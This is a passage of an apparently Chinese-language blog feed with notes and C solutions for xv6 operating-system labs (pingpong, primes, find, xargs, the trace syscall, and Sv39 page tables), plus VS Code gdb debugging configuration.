class="hljs-string">&quot;localhost:26000&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">//连接gebsever的ip和端口</span>            <span class="hljs-attr">&quot;externalConsole&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span>            <span class="hljs-attr">&quot;MIMode&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;gdb&quot;</span><span class="hljs-punctuation">,</span>            <span class="hljs-attr">&quot;preLaunchTask&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;xv6build&quot;</span><span class="hljs-punctuation">,</span>            <span class="hljs-attr">&quot;setupCommands&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>                <span class="hljs-punctuation">&#123;</span>                    <span class="hljs-attr">&quot;description&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;pretty printing&quot;</span><span class="hljs-punctuation">,</span>                    <span class="hljs-attr">&quot;text&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;-enable-pretty-printing&quot;</span><span class="hljs-punctuation">,</span>                    <span class="hljs-attr">&quot;ignoreFailures&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>                <span class="hljs-punctuation">&#125;</span>            <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>            <span class="hljs-comment">// &quot;logging&quot;: &#123;</span>            <span class="hljs-comment">//     &quot;engineLogging&quot;: true,</span>            <span class="hljs-comment">//     &quot;programOutput&quot;: true,</span>            <span class="hljs-comment">// &#125;</span>        <span class="hljs-punctuation">&#125;</span>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span># tasks.json<span class="hljs-comment">// tasks.json</span><span class="hljs-punctuation">&#123;</span>    <span class="hljs-attr">&quot;version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2.0.0&quot;</span><span class="hljs-punctuation">,</span>    <span class="hljs-attr">&quot;tasks&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>        <span class="hljs-punctuation">&#123;</span>            <span class="hljs-attr">&quot;label&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;xv6build&quot;</span><span class="hljs-punctuation">,</span>            <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;shell&quot;</span><span class="hljs-punctuation">,</span>            <span class="hljs-attr">&quot;isBackground&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>            <span class="hljs-attr">&quot;command&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;make qemu-gdb&quot;</span><span class="hljs-punctuation">,</span>            <span class="hljs-attr">&quot;problemMatcher&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>                <span class="hljs-punctuation">&#123;</span>                    <span class="hljs-attr">&quot;pattern&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>                        <span class="hljs-punctuation">&#123;</span>                            <span class="hljs-attr">&quot;regexp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;.&quot;</span><span class="hljs-punctuation">,</span>                            <span class="hljs-attr">&quot;file&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>                            <span class="hljs-attr">&quot;location&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span>                            <span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3</span>                        <span class="hljs-punctuation">&#125;</span>                    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>                    <span class="hljs-attr">&quot;background&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>                        <span class="hljs-attr">&quot;beginsPattern&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;.*Now run &#x27;gdb&#x27; in another window.&quot;</span><span class="hljs-punctuation">,</span>                        <span class="hljs-comment">// 要对应编译成功后,一句echo的内容. 此处对应 Makefile Line:170</span>                        <span class="hljs-attr">&quot;endsPattern&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;.&quot;</span>                    <span class="hljs-punctuation">&#125;</span>                <span class="hljs-punctuation">&#125;</span>            <span class="hljs-punctuation">]</span>        <span class="hljs-punctuation">&#125;</span>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span><span class="hljs-comment">// .gdbinit.tmpl-riscv</span>set confirm offset architecture riscv<span class="hljs-punctuation">:</span>rv64#target remote <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-punctuation">:</span><span class="hljs-number">1234</span>symbol-file kernel/kernelset disassemble-next-line autoset riscv use-compressed-breakpoints yes&lt;!--code￼<span class="hljs-number">1</span>--&gt;</code></pre></li></ul><h2 id="pingpong"><a class="markdownIt-Anchor" href="#pingpong"></a> pingpong</h2><blockquote><p>注意：不用的管道需要关闭</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernel/types.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;user/user.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 1</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span>&#123;<br>    <span class="hljs-comment">//p1是父写给子，p2是子写给父</span><br>    <span class="hljs-type">int</span> p1[<span class="hljs-number">2</span>], p2[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">char</span> buf[MAXSIZE];<br>    pipe(p1);<br>    pipe(p2);<br>    <span class="hljs-type">int</span> pid = fork();<br><br>    <span class="hljs-keyword">if</span>(pid &gt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-comment">// close the pipe port and prevent others from operating</span><br>        <span class="hljs-comment">// 0 indicates read and 1 indicates write</span><br>        close(p1[<span class="hljs-number">0</span>]);<br>        close(p2[<span class="hljs-number">1</span>]);<br>        <br>        write(p1[<span class="hljs-number">1</span>], <span class="hljs-string">&quot; &quot;</span>, MAXSIZE);<br>        read(p2[<span class="hljs-number">0</span>], buf, MAXSIZE);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d: received pong\n&quot;</span>, getpid());<br><br>        close(p1[<span class="hljs-number">1</span>]);<br>        close(p2[<span class="hljs-number">0</span>]);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        close(p1[<span class="hljs-number">1</span>]);<br>        close(p2[<span class="hljs-number">0</span>]);<br><br>        read(p1[<span class="hljs-number">0</span>], buf, MAXSIZE);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d: received ping\n&quot;</span>, getpid());<br>        write(p2[<span class="hljs-number">1</span>], <span class="hljs-string">&quot; &quot;</span>, MAXSIZE);<br><br>        close(p1[<span class="hljs-number">0</span>]);<br>        close(p2[<span class="hljs-number">1</span>]);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="primes"><a class="markdownIt-Anchor" href="#primes"></a> primes</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernel/types.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;user/user.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NUM 36</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">child</span><span class="hljs-params">(<span class="hljs-type">int</span> *p)</span>;<br><span class="hljs-comment">//the parent thread is for pl and input the number</span><br><span class="hljs-comment">//the child thread is for selecting and printing, its child is for recursion</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span>&#123;<br>    <span class="hljs-type">int</span> pl[<span class="hljs-number">2</span>];<br>    pipe(pl);<br><br>    <span class="hljs-keyword">if</span>(fork() &gt; <span class="hljs-number">0</span>)&#123;<br>        close(pl[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt; NUM; i++)<br>        &#123;<br>            write(pl[<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<span class="hljs-comment">//想管道写入数据，只有该数据被读后，才会写入下一个，这样就可以实现每个子进程只获取当前数字</span><br>        &#125;<br>        close(pl[<span class="hljs-number">1</span>]);<br>        wait(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        child(pl);<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">child</span><span class="hljs-params">(<span class="hljs-type">int</span>* pl)</span>&#123;<br>    <span class="hljs-type">int</span> pr[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span> n;<br><br>    close(pl[<span class="hljs-number">1</span>]);<br>    <span class="hljs-comment">//这里读取最开始的35个数字，若是读完了，那么就结束了</span><br>    <span class="hljs-type">int</span> read_result = read(pl[<span class="hljs-number">0</span>], &amp;n, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<span class="hljs-comment">//这里子进程只维护一开始的35个数字，后面的质数输出是靠孙进程来实现</span><br>    <span class="hljs-keyword">if</span>(!read_result)<span class="hljs-comment">//结束条件，没有数字了</span><br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br><br>    pipe(pr);<br>    <span class="hljs-keyword">if</span> (fork() &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>        close(pr[<span class="hljs-number">0</span>]);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;prime %d\n&quot;</span>, n);<br>        <span class="hljs-type">int</span> prime = n;<br>        <span class="hljs-comment">//子进程从父进程读取数字</span><br>        <span class="hljs-keyword">while</span> (read(pl[<span class="hljs-number">0</span>], &amp;n, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>)))<br>        &#123;<br>            <span class="hljs-keyword">if</span> (n % prime)<br>            &#123;<br>                <span class="hljs-comment">//子进程写给孙进程的数字</span><br>                write(pr[<span class="hljs-number">1</span>], &amp;n, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<span class="hljs-comment">//子进程向孙进程写入数据</span><br>            &#125;<br>        &#125;<br>        close(pr[<span class="hljs-number">1</span>]);<br>        wait(<span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        child(pr);<span class="hljs-comment">//再让更下一层的进程来处理之后的质数输出</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="find"><a class="markdownIt-Anchor" href="#find"></a> find</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernel/types.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;user/user.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernel/fs.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernel/stat.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernel/fcntl.h&quot;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">find</span><span class="hljs-params">(<span class="hljs-type">char</span> *path, <span class="hljs-type">char</span> *target_file)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">3</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ERROR: You need pass in only 2 arguments\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-type">char</span> *target_path = argv[<span class="hljs-number">1</span>];<br>    <span class="hljs-type">char</span> *target_file = argv[<span class="hljs-number">2</span>];<br>    find(target_path, target_file);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">find</span><span class="hljs-params">(<span class="hljs-type">char</span> *path, <span class="hljs-type">char</span> *target_file)</span><br>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">512</span>], *p;<br>    <span class="hljs-type">int</span> fd;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dirent</span> <span class="hljs-title">de</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br><br>    <span class="hljs-comment">//这里打开后给了句柄给fd，里面包含了所含&#x27;文件和目录&#x27;的名称</span><br>    <span class="hljs-keyword">if</span>((fd = open(path, <span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;cannot open\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//这里fstat用于获取一个已经打开的文件或设备的状态信息，以便于之后的判断</span><br>    <span class="hljs-keyword">if</span>(fstat(fd, &amp;st) &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;cannot stat&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//读取该fd(目录)包含的文件或目录的名称,若是一个文件，那就是读取自身的名称</span><br>    <span class="hljs-keyword">while</span>(read(fd,&amp;de,<span class="hljs-keyword">sizeof</span>(de)) == <span class="hljs-keyword">sizeof</span>(de))&#123;<br>        <span class="hljs-comment">//add the full path</span><br>        <span class="hljs-built_in">strcpy</span>(buf, path);<br>        p = buf + <span class="hljs-built_in">strlen</span>(buf);<br>        *p++ = <span class="hljs-string">&#x27;/&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(de.inum == <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">continue</span>;<br>        <span class="hljs-comment">//移动名称，这个时候p已经指向了/后面，所以直接赋值</span><br>        memmove(p, de.name, DIRSIZ);<br>        <span class="hljs-comment">//最后的数值为0，就是截断标志</span><br>        p[DIRSIZ] = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">if</span>(stat(buf,&amp;st) &lt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;connot stat&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">switch</span>(st.type)&#123;<br>            <span class="hljs-keyword">case</span> T_FILE:<br>                <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(de.name,target_file))&#123;<br>                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, buf);<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> T_DIR:<br>                <span class="hljs-comment">//排除了.与..目录</span><br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(de.name, <span class="hljs-string">&quot;.&quot;</span>) &amp;&amp; <span class="hljs-built_in">strcmp</span>(de.name, <span class="hljs-string">&quot;..&quot;</span>)) &#123;<br>                    find(buf, target_file);<br>                &#125;<br>        &#125;<br>    &#125;<br>    close(fd);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="xargs"><a class="markdownIt-Anchor" href="#xargs"></a> xargs</h2><ul><li><p>这里需要知道<code>echo ab | xargs echo 12 34</code>是输出<code>12 34 ab</code>，即<code>xargs</code>把前面的输出加到了自己指引的命令<code>echo</code>的参数中</p></li><li><p>对于 <code>echo a\nb xargs echo hello</code> ，它会输出</p><ul><li><pre class="highlight"><code class="bash">hello ahello b<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br>  - 这里<span class="hljs-string">&#x27;\n&#x27;</span>的作用就是重复再执行一遍xargs后的命令，不过前面的参数发生了改变。下面就体现在读到了<span class="hljs-string">&#x27;\n&#x27;</span>就直接结束<span class="hljs-keyword">while</span>循环，然后在下一次循环中输出<br><br>- 脚本如下<br><br>```c<br><span class="hljs-comment">#include &quot;kernel/types.h&quot;</span><br><span class="hljs-comment">#include &quot;user/user.h&quot;</span><br><span class="hljs-comment">#include &quot;kernel/param.h&quot;</span><br><span class="hljs-comment">#define MAXNUM 100</span><br><br>int main(int argc, char* argv[])&#123;<br>    char argument[MAXARG][MAXNUM];<br><span class="hljs-regexp">//</span>这里<span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)是判断<span class="hljs-string">&#x27;\n&#x27;</span>的情况，没有了就在下面使用read_result读不到了退出，然后再将之前的参数加载到xargs的参数后面，然后再执行一遍<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>        memset(argument, <span class="hljs-number">0</span>, MAXARG * MAXNUM);<br>        int count = argc - <span class="hljs-number">1</span>;<br>        <span class="hljs-regexp">//</span>argv[<span class="hljs-number">0</span>]是xargs本身，需要剔除<br>        <span class="hljs-keyword">for</span> (int i = <span class="hljs-number">1</span>; i &lt; argc; i++)<br>        &#123;<br>            strcpy(argument[i-<span class="hljs-number">1</span>], argv[i]);<br>        &#125;<br><br>        int xargc = <span class="hljs-number">0</span>;<br>        char buf;<br>        int read_sult;<br>        int flag = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-regexp">//</span>这里从标准输出符<span class="hljs-number">0</span>处读取前面命令的输出内容，这里一个一个字符地读，来区分不同的arg<br>        <span class="hljs-keyword">while</span> ((read_sult = read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">1</span>)) &gt; <span class="hljs-number">0</span> &amp;&amp; buf != <span class="hljs-string">&#x27;\n&#x27;</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(buf == <span class="hljs-string">&#x27; &#x27;</span> &amp;&amp; flag)&#123;<br>                count++;<br>                xargc = <span class="hljs-number">0</span>;<br>                flag = <span class="hljs-number">0</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(buf != <span class="hljs-string">&#x27; &#x27;</span>)&#123;<br>                argument[count][xargc++] = buf;<br>                flag = <span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-regexp">//</span>读到了<span class="hljs-string">&#x27;\n&#x27;</span>,退出<span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span>(read_sult &lt;= <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <br>        <span class="hljs-regexp">//</span>这里xargs后面的第一个参数是一个命令<br>        char *command = argv[<span class="hljs-number">1</span>];<br>        char *xargs[MAXARG];<br>        <span class="hljs-keyword">for</span> (int i = <span class="hljs-number">0</span>; i &lt; MAXARG - <span class="hljs-number">1</span>; i++)<br>        &#123;<br>            xargs[i] = argument[i];<br>        &#125;<br>        <span class="hljs-regexp">//</span><span class="hljs-number">0</span>截断<br>        xargs[MAXARG - <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>        <br>        <span class="hljs-keyword">if</span> (fork() &gt; <span class="hljs-number">0</span>)<br>        &#123;<br>            wait(<span class="hljs-number">0</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            exec(command, xargs);<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li></ul></li></ul><h1 id="lab2"><a class="markdownIt-Anchor" href="#lab2"></a> Lab2</h1><h2 id="trace"><a class="markdownIt-Anchor" href="#trace"></a> trace</h2><ul><li><p>梳理一下具体流程</p><ul><li><p>用户使用我们提供的系统调用接口 <strong>int trace(int)</strong>[user/user.h]</p></li><li><p>这个接口的实现由<strong>perl</strong>[user/usys.pl]脚本生成的汇编语言实现, 将<strong>SYS_trace</strong>的代号放入<strong>a7</strong>寄存器, 由<strong>ecall</strong>硬件支持由用户态转入内核态</p><ul><li><pre class="highlight"><code class="assembly">sub entry &#123;     my $name = shift;    print &quot;.global $name\n&quot;;    print &quot;$&#123;name&#125;:\n&quot;;    print &quot; li a7, SYS_$&#123;name&#125;\n&quot;; #     print &quot; ecall\n&quot;;    print &quot; ret\n&quot;;&#125;# compiler后, entry(&quot;trace&quot;)在usys.S里生成了如下的汇编代码trace: li a7, SYS_trace ecall ret # 这里就是将sys_trace的代码放在a7寄存器中# 然后用riscv提供的ecall指令从用户态切入到内核态!</code></pre></li></ul></li><li><p>控制转到系统调用的通用入口 <strong>void syscall(void)</strong>[kernel/syscall.c] 上. 它由<strong>a7</strong>寄存器读出需要被调用的系统调用号, 从 <em>static uint64 (*syscalls[])(void)</em> 这个函数指针数组跳转到那个具体的系统调用函数实现上. 将返回值放在<strong>a0</strong>寄存器里。</p></li><li><p>这里通过 <em>static uint64 (*syscalls[])(void)</em> 就已经执行系统调用函数了。根据num来查找执行的函数，执行到trace函数时，调用 <strong>sys_trace</strong>[kernel/sysproc.c]，通过 argint 获取参数，然后给当前进程中的 mask 赋值，以便 syscall 来使用。</p></li><li><p>执行完系统调用函数后，又回到 syscall 函数。然后从第二步的<strong>ecall</strong>里退出来了, 汇编指令<strong>ret</strong>使得用户侧系统调用接口返回，这样 trace 函数的执行完毕。</p></li><li><p>但是对于 trace 函数而言结束了，却留下了进程中的 mask 信息，这样当调用系统调用函数时，syscall都会检测 mask，如果匹配，则打印该系统调用函数的相关信息。</p></li></ul></li><li><p>总而言之，系统调用函数都是依靠syscall来实现的，但是trace是先在进程中设置了 mask 信息，这样每次依靠 syscall 来执行系统调用函数时，都会匹配 mask 信息来令 syscall 做出相关响应。</p></li></ul><h2 id="sysinfo"><a class="markdownIt-Anchor" href="#sysinfo"></a> sysinfo</h2><ul><li>这个的操作也是和trace一样</li><li>需要注意的就是</li></ul><h1 id="lab3"><a class="markdownIt-Anchor" href="#lab3"></a> Lab3</h1><h2 id="概念理解"><a class="markdownIt-Anchor" href="#概念理解"></a> 概念理解</h2><p>​每一个进程都拥有只属于自己的页表，当进程切换时，页表也会改变。</p><ul><li>三级页表都是通过64bit寄存器来存储，其中前10bit的下图没有写，是因为它是保留位，以后有作用的话再用上。中间44bit就是PPN，也就是物理内存地址，指向了真实的物理内存。最后的10bit是标志位，标识该页的属性。</li><li>44bit指向了真实的物理内存地址，但是物理地址在硬件上是56bit的，这就需要这44bit再加上12bit的0(因为物理内存以页表形式进行划分，一个页表大小为4096bit，即2^12，所以后面为全0，标识从物理页的起点开始算起)来组成最终完整的物理内存地址，然后进行索引。</li><li>这里虚拟内存地址为39位，前27位存储着3级页表的索引，后面12位则是最后在物理地址的偏移。通过前面27位的索引找到真实物理页地址，在加上偏移就是物理地址了。</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401252249152.png" alt="image-20240125224918027" /></p><ul><li>切换进程，TLB也需要切换</li></ul>]]></content>
    
    
    <categories>
      
      <category>OS相关</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Win64 Kernel 实验</title>
    <link href="/posts/7394324b.html"/>
    <url>/posts/7394324b.html</url>
    
